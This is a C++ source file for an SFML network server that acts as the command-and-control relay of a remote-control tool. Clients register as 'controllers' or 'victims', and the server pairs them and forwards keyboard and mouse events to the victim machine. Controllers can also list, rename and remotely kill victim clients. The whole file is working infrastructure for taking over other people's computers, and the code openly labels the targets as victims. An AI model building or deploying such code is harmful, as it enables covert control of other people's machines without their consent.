#include "server.h"

Server::Server()
{
	//start listening to the port. if it fails, exit
	if (listener.listen(SERVER_PORT) != sf::Socket::Done) {
		std::cout << "listening failed\n";
		std::exit(-1);
	}	
	selector.add(listener);
	std::cout << "listening on port " << SERVER_PORT << "\n";

	//start thread that checks if client are not asleep
	std::thread checkAwakeThread(&Server::checkAwake, this);
	checkAwakeThread.detach();
}
void Server::receive()
{
	//wait until a client has sent something
	if (!selector.wait())
		return;

	//mutex used for clients write access
	mutex.lock();
	//check if a client has received something
	for (auto& c : clients) {
		//look for the socket that has received something
		if (!selector.isReady(*c.second.socket))
			continue;

		sf::Packet p;
		c.second.socket->receive(p);

		//disconnect client
		if (p.getDataSize() == 0) {
			std::cout << "disconnected - ";
			disconnect(c.first);
			break;
		}

		c.second.lastMsg = Mlib::currentTime().asMil();

		//process the packet if it was received by a controller
		if (c.second.role == 'c')
			processControllerMsg(c.first, p);
		//process the packet if it was received by a victim
		else if (c.second.role == 'v')
			processVictimMsg(c.first, p);
		//process the packet if it was received by an uninitialized client
		else if (c.second.role == '-') {
			//get the client's role and name
			sf::Uint8 role;
			p >> role;
			p >> c.second.name;
			p.clear();

			//add new controller/victim to the list
			if (role == 'c' || role == 'v') {
				p << sf::Uint8(role);
				if (role == 'c')
					p << sf::Uint16(c.first);
				//tell the client that it has been initialized
				c.second.socket->send(p);
				c.second.role = role;
				std::cout << "new " << role << " - id: " << c.first << "\n";

				updateControllersList();
			}
			//tell the client that the command received wasnt valid
			else {
				p << sf::Uint8('?');
				c.second.socket->send(p);
			}
		}
	}
	//check if a client is ready to connect
	if (selector.isReady(listener)) {
		Client c;
		//add new client to list
		if (listener.accept(*c.socket) == sf::Socket::Done) {
			selector.add(*c.socket);
			clients.insert({ ++currentId, c });
		}
		//undo if client isnt accepted successfully
		else {
			delete c.socket;
			currentId--;
		}
	}
	mutex.unlock();
}
void Server::checkAwake()
{
	while (true) {
		//mutex used for clients access
		mutex.lock();
		//flag clients as afk if needed
		std::vector<sf::Uint16> idsToRemove;
		for (const auto& c : clients) {
			if (Mlib::currentTime().asMil() - c.second.lastMsg > 5'000)
				idsToRemove.push_back(c.first);
		}

		//disconnect afk clients
		for (auto id : idsToRemove) {
			std::cout << "timed out - ";
			disconnect(id);
		}
		mutex.unlock();

		//sleep to save processign power
		Mlib::sleep(Mlib::milliseconds(200));
	}
}

void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
{
	sf::Uint8 cmd;
	p >> cmd;

	//pair controller with victim
	if (cmd == 'p') {
		sf::Uint16 vId;
		p >> vId;
		//controller is already paired
		if (clients[id].pair != 0)
			return;
		//other client doesnt exist
		if (clients.find(vId) == clients.end())
			return;
		//other client is not a victim or is already paired
		if (clients[vId].role != 'v' || clients[vId].pair != 0)
			return;

		p.clear();
		p << sf::Uint8('p');
		//tell controller that is has been paired
		clients[id].socket->send(p);

		//actually pair the 2 clients
		clients[vId].pair = id;
		clients[id].pair = vId;

		updateControllersList();
	}
	//forward events to victim
	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' ||
		cmd == 'a' || cmd == 'z' || cmd == 's' || cmd == 'x') {

		//controller is not paired
		if (clients[id].pair == 0)
			return;

		clients[clients[id].pair].socket->send(p);
	}
	//unpair controller from victim
	else if (cmd == 'u') {
		//controller is not paired
		if (clients[id].pair == 0)
			return;

		sf::Packet p;
		p << sf::Uint8('u');
		//tell controller to unpair
		clients[id].socket->send(p);

		//stop keyboard control
		p.clear();
		p << sf::Uint8('z');
		clients[clients[id].pair].socket->send(p);
		//stop mouse control
		p.clear();
		p << sf::Uint8('x');
		clients[clients[id].pair].socket->send(p);

		//actually unpair the 2 clients
		clients[clients[id].pair].pair = 0;
		clients[id].pair = 0;

		updateControllersList();
	}
	//disconnect a given client
	else if (cmd == 'e') {
		sf::Uint16 oId;
		p >> oId;

		//client doesnt exist
		if (clients.find(oId) == clients.end())
			return;
		//client isnt initialized
		if (clients[oId].role == '-')
			return;

		p.clear();
		p << sf::Uint8('e');
		//tell the client to kill himself
		clients[oId].socket->send(p);

		std::cout << "killed - ";
		disconnect(oId);
	}
	//rename a given client
	else if (cmd == 'w') {
		sf::Uint16 oId;
		std::string name;
		p >> oId >> name;

		//client doesnt exist
		if (clients.find(oId) == clients.end())
			return;
		//client isnt initialized
		if (clients[oId].role == '-')
			return;

		clients[oId].name = name;
		p.clear();
		p << sf::Uint8('w') << name;
		//send the new name to the client
		clients[oId].socket->send(p);

		updateControllersList();
	}
	//apparently controller thinks it isn't initialized
	else if (cmd == 'c' || cmd == 'v') {
		//reset controller's role and name
		clients[id].role = '-';
		clients[id].name = "";
	}
}
void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
{
	sf::Uint8 cmd;
	p >> cmd;

	//apparently victim thinks it isn't initialized
	if (cmd == 'c' || cmd == 'v') {
		//reset controller's role and name
		clients[id].role = '-';
		clients[id].name = "";
	}
}

void Server::disconnect(sf::Uint8 id)
{
	sf::Packet p;
	//unpair the paired client
	if (clients[id].pair != 0) {
		//if client is controller, tell him to unpair
		if (clients[clients[id].pair].role == 'c') {
			p.clear();
			p << sf::Uint8('u');
			clients[clients[id].pair].socket->send(p);
		}
		//if client is victim, tell his to release all keys
		else if (clients[clients[id].pair].role == 'v')
		{
			//stop keyboard control
			p.clear();
			p << sf::Uint8('z');
			clients[clients[id].pair].socket->send(p);
			//stop mouse control
			p.clear();
			p << sf::Uint8('x');
			clients[clients[id].pair].socket->send(p);
		}
		
		//actually unpair other client
		clients[clients[id].pair].pair = 0;
	}
	//remove client from list/selector
	selector.remove(*clients[id].socket);
	delete clients[id].socket;
	clients.erase(id);

	std::cout << "id: " << int(id) << "\n";
	updateControllersList();
}
void Server::updateControllersList()
{
	//send a packet to all controllers
	auto sendControllers = [this](sf::Packet p) {
		for (auto& c : clients)
		{
			if (c.second.role == 'c')
				c.second.socket->send(p);
		}
	};

	//tell controllers to clear clients list
	sf::Packet p;
	p << sf::Uint8('q');
	sendControllers(p);

	//send to controllers each client info
	for (const auto& c : clients) {
		//skip if client isnt initialized
		if (c.second.role == '-')
			continue;

		//load all client info
		p.clear();
		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.name << c.second.time;
		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << sf::Uint16(c.second.pair);

		//send clint info to all controllers
		sendControllers(p);
	}

	//tell controllers to display clients list
	p.clear();
	p << sf::Uint8('d');
	sendControllers(p);
}